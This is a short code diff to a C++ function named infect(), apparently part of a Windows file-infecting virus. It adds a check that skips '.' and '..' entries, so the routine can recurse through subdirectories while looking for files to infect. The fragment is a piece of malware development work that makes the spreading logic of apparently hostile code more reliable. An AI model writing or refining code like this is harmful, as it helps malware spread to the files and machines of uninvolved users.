@@ -208,6 +208,12 @@ int infect(void)
          if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10)
          {
             char slash[] = {'\\',0};
+            char dot[] = {'.', 0};
+            char dotDot[] = {'.', '.', 0};
+
+            if (strnicmp(find_data.cFileName, dot, 1) == 0 || strnicmp(find_data.cFileName, dotDot, 2) == 0)
+               continue;
+            
             char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
             memcpy(new_directory, search_visit, strlen(search_visit)+1);
             strncat(new_directory, slash, strlen(slash));
